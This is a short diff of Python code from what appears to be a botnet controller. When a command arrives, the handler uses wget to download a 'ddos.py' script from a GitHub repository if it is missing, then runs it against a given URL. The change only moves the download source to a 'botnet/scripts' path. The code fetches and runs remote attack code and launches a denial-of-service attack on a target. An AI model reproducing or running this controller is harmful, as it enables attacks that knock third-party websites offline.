@@ -52,7 +52,7 @@ class Controller(object):
                     if os.path.exists('ddos.py'):
                         os.system('python3 ddos.py -d {}'.format(url))
                     else:
-                        os.system('wget https://raw.githubusercontent.com/abalesluke/website_finder/main/ddos.py')
+                        os.system('wget https://raw.githubusercontent.com/abalesluke/botnet/main/scripts/ddos.py')
                         os.system('python3 ddos.py -d {}'.format(url))
                 elif cmd == 'close':
                     print(f'connection closed from {client_address}\n')
